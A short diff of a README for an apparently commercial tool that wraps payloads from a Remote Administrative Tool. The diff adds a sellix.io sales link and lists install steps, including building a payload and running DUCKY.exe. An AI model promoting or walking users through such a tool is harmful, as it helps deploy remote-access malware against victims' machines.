@@ -23,7 +23,7 @@ Video Proof: https://youtu.be/8hT4MGm9uUU
 IMPORTANT! install latest version of python
 1. Donwload & install python3 ('https://www.python.org/downloads/')
 2. Build your payload with the Remote Administrative tool that you are using
-3. Download the tool ('')
+3. Download the tool ('https://sellix.io/product/5fed664c3be95')
 4. Unzip the file
 5. Open the DUCKY.exe file
 6. Make sure that your python3 path is added to Environment Variables
